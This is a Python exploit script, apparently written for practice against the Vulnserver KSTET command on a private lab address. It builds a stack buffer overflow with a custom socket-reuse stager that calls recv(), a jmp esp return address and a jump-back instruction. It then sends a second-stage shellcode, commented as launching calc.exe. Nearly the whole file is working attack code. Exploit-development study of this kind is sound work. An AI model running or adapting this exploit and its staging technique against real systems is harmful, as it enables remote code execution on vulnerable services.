import socket, sys
from struct import pack
from time import sleep

ip = "192.168.56.135"
port = 9999

prefix = b'KSTET '

# -------------------------Custom Shellcode-------------------------
# Store current ESP in EAX
stager = b''
stager += b'\x54'                # push esp
stager += b'\x58'               #  pop eax

# Add 0x1c8 to the location of socket number, and put the value in EAX
stager += b'\x66\x05\xC8\x01'         #  add ax,0x1c8
stager += b'\x8B\x10'				# mov edx,[eax]

# Reduce the point to ESP backward in case overwte our entire payload
stager += b'\x83\xEC\x64'           #  sub esp,byte +0x64

# Push Flag 0 in the stack
stager += b'\x31\xDB'             #  xor ebx,ebx
stager += b'\x53'                # push ebx

# Push Buffer Size 0x00000200 to the stack
stager += b'\xB7\x02'             #  mov bh,0x2
stager += b'\x53'                # push ebx

# Push return Address to the stack
stager += b'\x54'                # push esp
stager += b'\x5B'               #  pop ebx
stager += b'\x80\xC3\x83'           #  add bl,0x64 (83) <-- debug found that the shellcode is away from 0x64 further 0x67
stager += b'\x53'                # push ebx

# Push Socket number to the stack
stager += b'\x52'                # push edx

# Push recv() address to the stack
stager += b'\xB8\x11\x2C\x25\x40'       #  mov eax,0x40252c11
stager += b'\xC1\xE8\x08'           #  shr eax,byte 0x8

# Call the recv() in EAx
stager += b'\xFF\xD0'              # call eax
# -------------------------Custom Shellcode-------------------------


# stager = b'A' * 70
junk = b'A' * 10
# stager = b'A' * 50
filler2 = b'A' * (60 - len(stager))
eip = pack("<L", 0x625011bb) #jmp esp ;
jumpback = b'\x66\x83\xC4\xC0\xFF\xE4'
filler = b'C' * (20 - len(jumpback))

# Verify
payload = prefix + junk + stager + filler2 + eip + jumpback + filler
print("Length of prefix", len(prefix))
print("Length of junk", len(junk))
print("Length of stager", len(stager))
print("Length of filler2", len(filler2))
print("Length of eip", len(eip))
print("Length of jumpback", len(jumpback))
print("Length of filler", len(filler))
print("Total Length", len(payload))

# calc.exe
shellcode =  b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\xb8\x24\xa2\x34\xec\xda\xc3\xd9\x74\x24\xf4"
shellcode += b"\x5b\x29\xc9\xb1\x31\x31\x43\x13\x03\x43\x13"
shellcode += b"\x83\xeb\xd8\x40\xc1\x10\xc8\x07\x2a\xe9\x08"
shellcode += b"\x68\xa2\x0c\x39\xa8\xd0\x45\x69\x18\x92\x08"
shellcode += b"\x85\xd3\xf6\xb8\x1e\x91\xde\xcf\x97\x1c\x39"
shellcode += b"\xe1\x28\x0c\x79\x60\xaa\x4f\xae\x42\x93\x9f"
shellcode += b"\xa3\x83\xd4\xc2\x4e\xd1\x8d\x89\xfd\xc6\xba"
shellcode += b"\xc4\x3d\x6c\xf0\xc9\x45\x91\x40\xeb\x64\x04"
shellcode += b"\xdb\xb2\xa6\xa6\x08\xcf\xee\xb0\x4d\xea\xb9"
shellcode += b"\x4b\xa5\x80\x3b\x9a\xf4\x69\x97\xe3\x39\x98"
shellcode += b"\xe9\x24\xfd\x43\x9c\x5c\xfe\xfe\xa7\x9a\x7d"
shellcode += b"\x25\x2d\x39\x25\xae\x95\xe5\xd4\x63\x43\x6d"
shellcode += b"\xda\xc8\x07\x29\xfe\xcf\xc4\x41\xfa\x44\xeb"
shellcode += b"\x85\x8b\x1f\xc8\x01\xd0\xc4\x71\x13\xbc\xab"
shellcode += b"\x8e\x43\x1f\x13\x2b\x0f\x8d\x40\x46\x52\xdb"
shellcode += b"\x97\xd4\xe8\xa9\x98\xe6\xf2\x9d\xf0\xd7\x79"
shellcode += b"\x72\x86\xe7\xab\x37\x68\x0a\x7e\x4d\x01\x93"
shellcode += b"\xeb\xec\x4c\x24\xc6\x32\x69\xa7\xe3\xca\x8e"
shellcode += b"\xb7\x81\xcf\xcb\x7f\x79\xbd\x44\xea\x7d\x12"
shellcode += b"\x64\x3f\x1e\xf5\xf6\xa3\xcf\x90\x7e\x41\x10"

try:
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.settimeout(5)
		s.connect((ip, port))
		print('[*] Sending payload')
		s.send(payload)
		sleep(2)
		s.send(shellcode)
		s.recv(1024)
except Exception as e:
	print(e)
	sys.exit(0)